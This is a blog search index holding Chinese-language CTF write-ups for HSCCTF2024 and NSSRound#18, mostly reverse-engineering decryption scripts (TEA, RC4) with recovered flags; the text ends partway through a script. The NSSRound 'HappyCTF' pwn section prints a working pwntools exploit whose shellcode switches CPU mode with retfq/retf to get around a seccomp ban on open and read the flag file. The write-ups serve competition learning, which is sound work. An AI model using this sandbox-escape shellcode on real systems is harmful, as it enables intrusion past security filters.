<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HSCCTF2024</title>
    <link href="/2024/03/10/HSCCTF2024/"/>
    <url>/2024/03/10/HSCCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hello-hscctf"><a href="#hello-hscctf" class="headerlink" title="hello-hscctf"></a>hello-hscctf</h2><p>从图片中提取关键信息</p><img src="/2024/03/10/HSCCTF2024/1709965570558-80b04d90-c33f-4182-a596-1fc0d1c32809.png" class="" title="img"><p>(03338) 76 Friseur Kosmetik Montag，点最后一个</p><img src="/2024/03/10/HSCCTF2024/1709965436900-11ae5ee9-924f-4600-ba89-9405fc614a7d.png" class="" title="img"><p>报纸左下角，搜Friseursalon Aerts</p><img src="/2024/03/10/HSCCTF2024/1709965629705-cf6b6322-fd1e-4e6f-846b-6f8265b578d6.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965400607-02188237-d602-462f-83ce-16783c0c243f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965382282-d5912365-6756-4b76-a271-5435c9507387.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>经典tea，密文呈现形式不同</p><img src="/2024/03/10/HSCCTF2024/1709961606736-8a0ceb3b-ea31-492f-8fad-249437667224.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><br><span class="hljs-built_in">int</span> main() &#123;<br>uint32_t v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>uint32_t delta = <span class="hljs-number">0x61C88647</span>;<br>uint32_t v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], <span class="hljs-built_in">sum</span> = -<span class="hljs-number">32</span> * delta, i; /* <span class="hljs-built_in">set</span> up */<br><br>uint32_t v2[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span>&#125;, v3[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span>&#125;, v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0xb805d767</span>, <span class="hljs-number">0x63c174c3</span>&#125;; //<span class="hljs-number">0x67</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0xb8</span><br>unsigned <span class="hljs-built_in">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>uint32_t k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>// v为要加密的数据是两个<span class="hljs-number">32</span>位无符号整数<br>// k为加密解密密钥，为<span class="hljs-number">4</span>个<span class="hljs-number">32</span>位无符号整数，即密钥长度为<span class="hljs-number">128</span>位<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">2</span>; m += <span class="hljs-number">2</span>) &#123;//flag不全的话有可能是<span class="hljs-number">10</span><br>//<span class="hljs-built_in">sum</span> = -<span class="hljs-number">957401312</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     /* basic cycle start */<br>v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + <span class="hljs-built_in">sum</span>) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + <span class="hljs-built_in">sum</span>) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><span class="hljs-built_in">sum</span> += delta;<br>&#125;                                              /* end cycle */<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br>printf(<span class="hljs-string">&quot;%x &quot;</span>, v5[i]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>//printf(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/03/10/HSCCTF2024/1709961543764-2858e782-886c-4814-a0aa-e5deb5787d5a.png" class="" title="img"><p>谁懂啊，exe输入错误，但是直接交是对的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">688</span>ed036-a86a60ce&#125;<br></code></pre></td></tr></table></figure><h2 id="no-py"><a href="#no-py" class="headerlink" title="no_py"></a>no_py</h2><p>pyc反编译效果不好</p><img src="/2024/03/10/HSCCTF2024/1709966236128-15b77610-7093-4097-be67-f0c51fd89e1d.png" class="" title="img"><p>用在线工具后发现key和enc在其他文件中，感觉和beginCTF的ezpython一模一样</p><img src="/2024/03/10/HSCCTF2024/1709966361759-cd04823d-7b18-46fe-92de-685d0ab82524.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709966965760-a8512425-228e-4aec-a16b-50247053893f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967326961-01a13c08-39ea-41d0-a149-0b09f1ba2bbb.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967524943-3a4e06c9-246e-417a-858c-f7bcaf4e2598.png" class="" title="img"><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><p>基本玩不出的游戏</p><img src="/2024/03/10/HSCCTF2024/1710038562295-31b684f0-b508-4741-9a19-c167db74bd2d.png" class="" title="img"><p>通过算法识别找到blowfish</p><img src="/2024/03/10/HSCCTF2024/1710038776255-a545b936-9122-410b-83f6-e73861058139.png" class="" title="img"><p>7.5的汉化效果好</p><img src="/2024/03/10/HSCCTF2024/1710039007125-ad52680c-29fa-464a-9830-25e876189981.png" class="" title="img"><p>后来按题目的思路走，修改程序一次完成，应该是自解密，不用解程序会帮我解</p><img src="/2024/03/10/HSCCTF2024/1710041102825-dbd65880-e0c1-42f9-aecf-21f84b4f1807.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">HSCCTF</span><span class="hljs-template-variable">&#123;H31L0_My_FR13ND!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="the-wolf-song"><a href="#the-wolf-song" class="headerlink" title="the_wolf_song"></a>the_wolf_song</h2><p>能识别但用不上</p><img src="/2024/03/10/HSCCTF2024/1710042320322-4ed576c7-5a94-4cb2-bf45-50ffa76d82a9.png" class="" title="img"><p>调试过掉前面的音乐</p><img src="/2024/03/10/HSCCTF2024/1710054119801-e25294b2-b516-4e4a-873c-b812f5d83c02.png" class="" title="img"><p>rc4算法，第一个内存会被初始化</p><img src="/2024/03/10/HSCCTF2024/1710054235494-d36be0da-eac4-4265-9a1c-75e7b59a40fc.png" class="" title="img"><p>流程在代码的第一行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#^6 -&gt; ^3 -&gt; rc4:HSCCTF&#123;FAKE_FLAG!&#125; -&gt; ^j -&gt; ^fake_flag[i] ^fake_flag[i+1] -&gt; ^j</span><br>fake_flag=<span class="hljs-string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span><br>enc=[<span class="hljs-number">0xce</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0x68</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(enc))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)-<span class="hljs-number">1</span>):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i+<span class="hljs-number">1</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i])<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><br>key=<span class="hljs-built_in">bytes</span>(fake_flag.encode())<br>decrypted = rc4(enc, key)<br><span class="hljs-comment">#print(decrypted)</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>    flag+=<span class="hljs-built_in">chr</span>(decrypted[i]^<span class="hljs-number">3</span>^<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br>HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;<br></code></pre></td></tr></table></figure><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><img src="/2024/03/10/HSCCTF2024/1710057980233-dcb6dd18-2c42-474d-90c4-def9b46433e5.png" class="" title="img"><p>找到关键函数，murmur3_32明显要动调</p><img src="/2024/03/10/HSCCTF2024/1710058239980-9f7b6594-99ca-4cf5-a0f6-aef795cbbdb7.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1710058389286-a856058d-c969-42f7-9b0d-228886c4e399.png" class="" title="img"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="funny"><a href="#funny" class="headerlink" title="funny"></a>funny</h2><img src="/2024/03/10/HSCCTF2024/1710041422186-08d964df-4990-493b-be7d-25c5069b4332.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IDA显示中文字符</title>
    <link href="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/"/>
    <url>/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>之前ida一直不知道如何识别中文字符<img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210011904.png" class="" title="image-20240304210011904"></p><p>在目录后面加参数-dCULTURE&#x3D;all和把编码方式改为gbk都失败了</p><p>后来用学长的ida发现能正常显示中文，查看编码方式原来是gb2312</p><p>于是我在ida8.3里右键插入新的编码方式</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210343584.png" class="" title="image-20240304210343584"><p>然后在ida左下角右键重新分析</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210511607.png" class="" title="image-20240304210511607"><p>再右键rebuild即可</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210546604.png" class="" title="image-20240304210546604">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound#18部分wp</title>
    <link href="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HappyCTF"><a href="#HappyCTF" class="headerlink" title="HappyCTF"></a>HappyCTF</h2><p>参考链接：<a href="https://xz.aliyun.com/t/6645?time__1311=n4+xnD0DRDBGitN47KDsA3xCqbu75eD9AQ=oD&alichlgref=https://www.baidu.com/link?url=A-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q&wd=&eqid=f2850db1072b3e270000000265cc33af">https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbu75eD9AQ%3DoD&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DA-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q%26wd%3D%26eqid%3Df2850db1072b3e270000000265cc33af</a></p><p>看到rwx基本上是shellcode</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png" class="" title="img"><p>vuln函数反编译不了，问题不大</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png" class="" title="img"><p>敲，后面发现把open给禁了，那得用retfq和retf了</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28592)</span><br>p = process(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4013a0&#x27;)</span><br>sh = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 9 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 7</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 34</span><br><span class="hljs-string">pop r10</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">/read/</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">push 200</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sd = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,0x40404040</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">push 0x00006761</span><br><span class="hljs-string">push 0x6c662f2e</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404062</span><br><span class="hljs-string">retf</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>sf = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sa(<span class="hljs-string">&quot;:&quot;</span>,sh)<br>pause()<br>sl(sd+sf)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>直接密文去解密不对</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png" class="" title="img"><p>有tls也绕过了（tls不一定能够用上）</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png" class="" title="img"><p>也没看出有其他的算法</p><p>这种一般都是自己设计的算法，要静下心来看</p><p>发现先十进制转二进制</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png" class="" title="img"><p>经过rc4初始化算法</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png" class="" title="img"><p>再把二进制转化为十进制作为下标去找对应的值，类似于base64</p><p>这种要通过爆破，首先找密文在table里的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">table = [<br>    <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC9</span>,<br>    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD3</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xE3</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xED</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>,<br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xB6</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xAE</span><br>]<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;E2F7D3E2C8B4D8C5CFB4E7EEE1D9F1EFCBEBD9C9CEC5D9E5CCB7D1EDE0B4F1EEE0E7D2F6CBF3C9F3D3D5EF&quot;</span>)<br><span class="hljs-built_in">print</span>(enc)<br>idx = []<br><br><span class="hljs-keyword">for</span> i 